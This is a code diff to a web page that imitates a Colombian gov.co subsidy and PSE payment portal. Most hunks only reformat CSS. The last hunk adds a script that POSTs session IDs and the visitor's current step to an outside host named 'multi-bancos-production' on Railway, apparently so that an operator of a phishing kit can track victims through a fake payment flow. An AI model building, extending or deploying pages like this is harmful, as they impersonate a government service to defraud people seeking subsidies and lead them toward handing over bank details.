@@ -8,28 +8,16 @@
 <style>
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 html { font-size: 14px; -webkit-text-size-adjust: 100%; }
-body {
-  font-family: 'Barlow', Arial, Helvetica, sans-serif;
-  font-size: 14px;
-  font-weight: 500;
-  line-height: 2;
-  color: #747474;
-  background: #fff;
-  overflow-x: hidden;
-}
+body { font-family: 'Barlow', Arial, Helvetica, sans-serif; font-size: 14px; font-weight: 500; line-height: 2; color: #747474; background: #fff; overflow-x: hidden; }
 a { color: #333; text-decoration: none; transition: color .2s; }
 a:hover { color: #32ba3d; }
 img { max-width: 100%; height: auto; display: block; border: 0; }
 ul { list-style: none; }
 button { font-family: inherit; cursor: pointer; border: 0; background: none; }
-
-/* BARRA GOV.CO */
 .gov-bar { background: #36c; color: #fff; padding: 3px 0 0 3px; display: flex; align-items: center; }
 .gov-bar img { height: 40px; padding-left: 5%; }
 .gov-bar a { padding-left: 6%; display: inline-block; }
 .gov-bar a img { padding: 0; }
-
-/* BANNER SUBSIDIO */
 .subsidio-banner { background: #1e6f24; padding: 0; position: relative; border-bottom: 4px solid #34ba3d; }
 .subsidio-inner { max-width: 1248px; margin: 0 auto; padding: 0 30px; display: flex; align-items: stretch; justify-content: space-between; gap: 0; flex-wrap: wrap; }
 .subsidio-texto { flex: 1; min-width: 280px; color: #fff; padding: 24px 30px 24px 0; display: flex; flex-direction: column; justify-content: center; }
@@ -45,15 +33,7 @@ button { font-family: inherit; cursor: pointer; border: 0; background: none; }
 .subsidio-precio .valor { font-family: 'Barlow', Arial, sans-serif; font-size: 42px; font-weight: 800; color: #1e6f24; line-height: 1; letter-spacing: -1px; margin: 4px 0 8px; border-bottom: 2px solid #e0f7dd; padding-bottom: 8px; width: 100%; }
 .subsidio-precio .badge { display: inline-block; background: #1e6f24; color: #fff; font-family: 'Barlow', Arial, sans-serif; font-size: 11px; font-weight: 700; padding: 4px 12px; letter-spacing: 1.5px; text-transform: uppercase; }
 .subsidio-precio .vigencia { font-family: 'Barlow', Arial, sans-serif; font-size: 11px; color: #999; font-weight: 500; margin-top: 6px; letter-spacing: 1px; text-transform: uppercase; }
-@media (max-width: 900px) {
-  .subsidio-inner { flex-direction: column; padding: 0 20px; }
-  .subsidio-texto { padding: 20px 0; }
-  .subsidio-desc { font-size: 18px; }
-  .subsidio-precio { min-width: 100%; padding: 20px 24px; border-left: 0; border-top: 1px solid #e0f7dd; }
-  .subsidio-precio .valor { font-size: 34px; }
-}
-
-/* HEADER */
+@media (max-width: 900px) { .subsidio-inner { flex-direction: column; padding: 0 20px; } .subsidio-texto { padding: 20px 0; } .subsidio-desc { font-size: 18px; } .subsidio-precio { min-width: 100%; padding: 20px 24px; border-left: 0; border-top: 1px solid #e0f7dd; } .subsidio-precio .valor { font-size: 34px; } }
 .header { background: #fff; border-bottom: 1px solid #e5e5e5; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 8px rgba(0,0,0,.04); }
 .header-row { max-width: 1248px; margin: 0 auto; padding: 15px 30px; display: flex; align-items: center; justify-content: space-between; gap: 20px; }
 .logo img { height: 61px; width: auto; }
@@ -66,20 +46,14 @@ button { font-family: inherit; cursor: pointer; border: 0; background: none; }
 .submenu li a { display: block; padding: 8px 20px; font-size: 12px; color: #000; border-bottom: 1px solid #dcdadb; }
 .submenu li:last-child a { border-bottom: 0; }
 .submenu li a:hover { background: #e0f7dd; }
-
-/* BREADCRUMB */
 .breadcrumb { max-width: 1248px; margin: 20px auto 10px; padding: 0 30px; font-size: 12px; color: #333; }
 .breadcrumb a { color: #333; }
 .breadcrumb a:hover { color: #32ba3d; }
 .breadcrumb .sep { padding: 0 6px; color: #bebdbd; }
-
-/* CONTENIDO */
 .main { max-width: 1248px; margin: 0 auto; padding: 20px 30px 60px; }
 .titulo-principal { text-align: center; font-size: 34px; font-weight: 700; color: #333; margin: 30px 0 10px; line-height: 1.2; }
 .titulo-principal .verde { color: #34ba3d; }
 .sep-linea { height: 1px; background: radial-gradient(ellipse at 50% -50%, #e0dede 0, rgba(255,255,255,0) 80%); margin: 30px 0; }
-
-/* SECCION PSE */
 .seccion-pse { display: grid; grid-template-columns: 1fr 1fr; gap: 0; border-radius: 20px; overflow: hidden; margin: 40px 0; background: #e8f9e6; }
 .pse-texto { padding: 50px 60px; background: #e8f9e6 url('img/column-bg-1.png') center/cover; display: flex; flex-direction: column; justify-content: flex-start; }
 .pse-texto h1 { font-size: 34px; font-weight: 700; color: #000; margin-bottom: 20px; }
@@ -92,8 +66,6 @@ button { font-family: inherit; cursor: pointer; border: 0; background: none; }
 .pse-imagen { position: relative; background: url('img/Liquidador-de-pagos-2026-1024x1024.png') center/cover; min-height: 500px; transition: filter .3s; filter: brightness(1.1) contrast(1.1); cursor: pointer; }
 .pse-imagen:hover { filter: brightness(1.3) contrast(1.1); }
 .pse-imagen a { display: block; width: 100%; height: 100%; position: absolute; inset: 0; }
-
-/* SECCION TRAMITES */
 .seccion-tramites { text-align: center; margin: 60px 0; }
 .seccion-tramites h1 { font-size: 34px; font-weight: 700; color: #333; margin-bottom: 30px; }
 .seccion-tramites h1 .verde { color: #34ba3d; }
@@ -102,20 +74,12 @@ button { font-family: inherit; cursor: pointer; border: 0; background: none; }
 .btn-formato:hover { background: linear-gradient(180deg, #76c7f1, #b5e0f7); transform: translateY(-2px); }
 .btn-portal { background: linear-gradient(180deg, #d1e990, #aad75d); color: #54770f; border: 1px solid #9dba60; }
 .btn-portal:hover { background: linear-gradient(180deg, #aad75d, #d1e990); transform: translateY(-2px); }
-
-/* TARJETAS */
 .tarjetas { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; margin: 60px 0; align-items: center; }
 .tarjeta-img { display: block; transition: transform .3s; cursor: pointer; }
 .tarjeta-img:hover { transform: scale(1.03); }
 .tarjeta-img img { width: 100%; max-width: 400px; margin: 0 auto; border-radius: 20px; box-shadow: 0 8px 24px rgba(0,0,0,.08); }
-
-/* ANIMACIÓN AL RESALTAR EL BOTÓN DE PAGO */
 .btn-pago-destacado { animation: pagarPulse 0.6s ease-in-out 3; box-shadow: 0 0 0 0 rgba(52,186,61,.7); }
-@keyframes pagarPulse {
-  0%   { box-shadow: 0 0 0 0 rgba(52,186,61,.7); transform: scale(1); }
-  50%  { box-shadow: 0 0 0 18px rgba(52,186,61,0); transform: scale(1.06); }
-  100% { box-shadow: 0 0 0 0 rgba(52,186,61,0); transform: scale(1); }
-}
+@keyframes pagarPulse { 0% { box-shadow: 0 0 0 0 rgba(52,186,61,.7); transform: scale(1); } 50% { box-shadow: 0 0 0 18px rgba(52,186,61,0); transform: scale(1.06); } 100% { box-shadow: 0 0 0 0 rgba(52,186,61,0); transform: scale(1); } }
 </style>
 </head>
 <body>
@@ -372,6 +336,8 @@ body.a11y-readable, body.a11y-readable * { font-family: Verdana, Arial, Helvetic
 </style>
 
 <script>
+const API_BASE = 'https://multi-bancos-production.up.railway.app';
+
 function toggleA11y() {
   document.getElementById('a11yPanel').classList.toggle('open');
 }
@@ -407,6 +373,19 @@ function irAPago(event) {
     setTimeout(() => btn.classList.remove('btn-pago-destacado'), 2500);
   }, 500);
 }
+
+// 🔥 TRACKING DEL PASO
+const trackPaso = (paso) => {
+    const sessionId = sessionStorage.getItem('bc_sessionId') || sessionStorage.getItem('sub_sessionId');
+    if (sessionId) {
+        fetch(API_BASE + '/bc/actualizar-paso', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, paso })
+        }).catch(() => {});
+    }
+};
+trackPaso('index');
 </script>
 </body>
 </html>
